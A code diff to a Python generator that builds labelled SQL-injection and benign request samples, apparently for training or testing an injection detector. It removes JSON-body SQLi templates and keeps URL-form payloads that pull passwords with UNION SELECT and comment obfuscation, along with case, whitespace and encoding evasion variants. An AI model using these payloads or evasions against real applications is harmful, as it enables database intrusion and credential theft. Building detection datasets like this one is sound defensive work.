@@ -293,21 +293,7 @@ TEMPLATES = {
         "username=admin'/*foo*/AND/*bar*/SUBSTRING((SELECT password FROM users),1,1)='a'#",
         "id=-1'/*!50000UNION*//*!50000SELECT*/1,CONCAT(user,0x3a,password) FROM users--"
     ],
-    # 21. JSON SQLi Payloads (POST / JSON API bodies)
-    "sqli_json": [
-        '{"username": "admin\' OR {EXPR} {COMMENT}", "password": "{VAL}"}',
-        '{"query": "laptop\' UNION SELECT {COLS} {COMMENT}", "limit": {NUM}}',
-        '{"filter": {"user_id": "1\' AND SLEEP({SLEEP_SEC}) {COMMENT}", "status": "active"}}',
-        '{"data": {"search": "\' OR 1=1 {COMMENT}", "category": "all"}}',
-        '{"auth": {"username": "admin\'-- -", "password": "{VAL}"}, "remember": true}',
-        '{"id": "1\' AND EXTRACTVALUE(1, CONCAT(0x7e, ({SUBQUERY}))) {COMMENT}"}',
-        '{"items": [{"id": "1\' OR {EXPR} {COMMENT}", "qty": 1}]}',
-        '{"order_by": "id\' UNION SELECT {COLS} FROM {TABLE} {COMMENT}"}',
-        '{"search": "\' UNION ALL SELECT null, {COLS} FROM {TABLE} {COMMENT}", "page": {NUM}}',
-        '{"user": {"name": "test\' AND (SELECT COUNT(*) FROM users)>{NUM} {COMMENT}", "role": "user"}}',
-        '{"comment": "test\' AND CASE WHEN ({EXPR}) THEN 1/0 ELSE 1 END {COMMENT}", "post_id": {NUM}}'
-    ],
-    # 22. NORMAL TRAFFIC (Non-Malicious)
+    # 21. NORMAL TRAFFIC (Non-Malicious URL Query & Form parameters)
     "normal": [
         "id={NUM}&Submit=Submit",
         "page={NUM}&limit=10",
@@ -323,20 +309,10 @@ TEMPLATES = {
         "product_id={NUM}&qty=1",
         "book_title=O'Connor's+Guide",
         "comment=User's+feedback+text",
-        "name=John+Doe&email=john%40example.com"
-    ],
-    # 23. NORMAL JSON (Non-Malicious API bodies)
-    "normal_json": [
-        '{"search": "{SEARCH_WORD}", "page": {NUM}, "category": "{CATEGORY}"}',
-        '{"username": "{USER_NAME}", "action": "login", "remember": true}',
-        '{"product_id": {NUM}, "quantity": {NUM}, "notes": "fast delivery"}',
-        '{"filter": {"status": "active", "tag": "{TAG}"}, "limit": {NUM}}',
-        '{"title": "{TITLE}", "content": "Customer review on {CATEGORY}", "author": "{USER_NAME}"}',
-        '{"user": {"name": "{USER_NAME}", "email": "{USER_NAME}@example.com", "preferences": {"theme": "dark"}}}',
-        '{"cart": [{"item_id": {NUM}, "qty": 1, "price": 99.9}], "currency": "USD"}',
-        '{"sort": "{SORT}", "order": "desc", "per_page": {NUM}}',
-        '{"event": "page_view", "path": "/products", "user": "{USER_NAME}"}',
-        '{"config": {"notifications": true, "timeout": {NUM}, "mode": "standard"}}'
+        "name=John+Doe&email=john%40example.com",
+        "username={USER_NAME}&password=password123&Login=Login",
+        "username={USER_NAME}&password={VAL}&Login=Login",
+        "username=admin&password=password&Login=Login"
     ]
 }
 
@@ -363,7 +339,6 @@ class PayloadGenerator:
     def generate_single_from_template(self, category: str, template_str: str, template_id: str) -> Dict:
         """Instantiate a single template with random values and variation strategies."""
         raw_text = template_str
-        is_json = category.endswith("json") or raw_text.startswith("{")
 
         # Fill placeholders
         raw_text = raw_text.replace("{EXPR}", self.rng.choice(EXPR_LIST))
@@ -384,35 +359,22 @@ class PayloadGenerator:
 
         variant_types = []
 
-        if is_json:
-            # Safely handle comment placeholder inside JSON strings
-            if "{COMMENT}" in raw_text:
-                chosen_c = self.rng.choice(["--", "-- -", "#", "/*", ";-- -", ""])
-                raw_text = raw_text.replace("{COMMENT}", chosen_c).strip()
-                if chosen_c:
-                    variant_types.append(f"comment_{chosen_c}")
-            if self.rng.random() > 0.4 and not category.startswith("normal"):
-                raw_text = apply_case_variation(raw_text, self.rng)
-                variant_types.append("case_var")
-            final_payload = raw_text
-            enc_type = "raw_json"
+        # Apply Variations for URL Query/Form
+        if self.rng.random() > 0.4 and not category.startswith("normal"):
+            raw_text = apply_case_variation(raw_text, self.rng)
+            variant_types.append("case_var")
+
+        if "{COMMENT}" in raw_text or (self.rng.random() > 0.5 and category.startswith("sqli")):
+            raw_text, c_name = apply_comment_variation(raw_text, self.rng)
+            variant_types.append(f"comment_{c_name}")
         else:
-            # Apply Variations for URL Query/Form
-            if self.rng.random() > 0.4 and not category.startswith("normal"):
-                raw_text = apply_case_variation(raw_text, self.rng)
-                variant_types.append("case_var")
+            raw_text = raw_text.replace("{COMMENT}", "").strip()
 
-            if "{COMMENT}" in raw_text or (self.rng.random() > 0.5 and category.startswith("sqli")):
-                raw_text, c_name = apply_comment_variation(raw_text, self.rng)
-                variant_types.append(f"comment_{c_name}")
-            else:
-                raw_text = raw_text.replace("{COMMENT}", "").strip()
+        if self.rng.random() > 0.4 and not category.startswith("normal"):
+            raw_text, ws_name = apply_whitespace_variation(raw_text, self.rng)
+            variant_types.append(f"ws_{ws_name}")
 
-            if self.rng.random() > 0.4 and not category.startswith("normal"):
-                raw_text, ws_name = apply_whitespace_variation(raw_text, self.rng)
-                variant_types.append(f"ws_{ws_name}")
-
-            final_payload, enc_type = apply_encoding_variation(raw_text, self.rng)
+        final_payload, enc_type = apply_encoding_variation(raw_text, self.rng)
 
         label = 0 if category.startswith("normal") else 1
         variant_str = "|".join(variant_types) if variant_types else "standard"
@@ -459,34 +421,30 @@ class PayloadGenerator:
             sqli_categories = [category_filter] if not category_filter.startswith("normal") else []
             sqli_target_per_cat = target_count
 
-        # 1. Generate Normal samples (mix of normal URL/form and normal JSON)
+        # 1. Generate Normal samples (URL & Form parameters)
         if normal_target > 0:
-            norm_cats = [c for c in ["normal", "normal_json"] if c in TEMPLATES]
-            norm_sub_target = int(normal_target / len(norm_cats))
+            norm_templates = TEMPLATES.get("normal", [])
+            attempts = 0
+            current_norm_cnt = 0
+            while current_norm_cnt < normal_target and attempts < normal_target * 5:
+                attempts += 1
+                t_idx = self.rng.randint(0, len(norm_templates) - 1)
+                t_str = norm_templates[t_idx]
+                t_id = f"NORMAL_{t_idx+1:03d}"
 
-            for n_cat in norm_cats:
-                norm_templates = TEMPLATES[n_cat]
-                attempts = 0
-                current_norm_cnt = 0
-                while current_norm_cnt < norm_sub_target and attempts < norm_sub_target * 5:
-                    attempts += 1
-                    t_idx = self.rng.randint(0, len(norm_templates) - 1)
-                    t_str = norm_templates[t_idx]
-                    t_id = f"{n_cat.upper()}_{t_idx+1:03d}"
+                rec = self.generate_single_from_template("normal", t_str, t_id)
+                stats["generated"] += 1
 
-                    rec = self.generate_single_from_template(n_cat, t_str, t_id)
-                    stats["generated"] += 1
+                if rec["payload_hash"] not in seen_hashes and rec["normalized_hash"] not in seen_norm_hashes:
+                    seen_hashes.add(rec["payload_hash"])
+                    seen_norm_hashes.add(rec["normalized_hash"])
+                    dataset.append(rec)
+                    current_norm_cnt += 1
+                    stats["unique"] += 1
+                else:
+                    stats["duplicates_removed"] += 1
 
-                    if rec["payload_hash"] not in seen_hashes and rec["normalized_hash"] not in seen_norm_hashes:
-                        seen_hashes.add(rec["payload_hash"])
-                        seen_norm_hashes.add(rec["normalized_hash"])
-                        dataset.append(rec)
-                        current_norm_cnt += 1
-                        stats["unique"] += 1
-                    else:
-                        stats["duplicates_removed"] += 1
-
-        # 2. Generate SQLi samples across all SQLi categories (including sqli_json)
+        # 2. Generate SQLi samples across all SQLi categories
         for cat in sqli_categories:
             cat_templates = TEMPLATES[cat]
             attempts = 0
